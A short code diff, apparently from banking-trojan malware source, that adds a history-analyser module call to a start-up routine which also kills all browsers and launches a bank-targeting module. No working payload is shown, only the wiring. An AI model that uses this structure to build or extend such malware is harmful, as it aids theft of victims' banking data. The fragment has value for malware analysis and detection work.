@@ -49,6 +49,10 @@ void ExplorerStart(PEventData Data)
 
 	KillAllBrowsers();
 
+	#ifdef HistoryAnalizerH
+    	HisAnalizer::Execute();
+	#endif
+
 	#ifdef BBSCBankH
 		CBank::Start();
 	#endif
